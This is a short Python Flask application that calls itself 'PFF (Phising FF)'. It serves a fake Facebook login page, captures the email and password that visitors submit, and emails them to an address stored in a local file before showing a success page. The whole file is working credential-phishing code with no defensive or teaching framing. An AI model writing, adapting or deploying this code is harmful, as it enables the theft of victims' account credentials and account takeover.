from flask import *
from kirim import send
import os
app = Flask(__name__)

@app.route("/login",methods=["POST","GET"])
def login():
	if request.method == "GET":
		return render_template("facebook.html")
	elif request.method == "POST":
		usr = request.form.get("email")
		pwd = request.form.get("password")
		email = open("data/email.txt","r").read()
		send(target=email, subject="Phising FF",user=usr, pwd=pwd)
		return render_template("sukses.html")

@app.route("/")
def index():
	if request.method == 'GET':
		return render_template("index.html")

if __name__ == "__main__":
#	print ("         WELCOME TO PFF (Phising FF)")
#	print ("      copyright (c) 20120 BILLAL FAUZAN")
	app.run(debug=True, host="0.0.0.0", port=os.environ.get("PORT"))
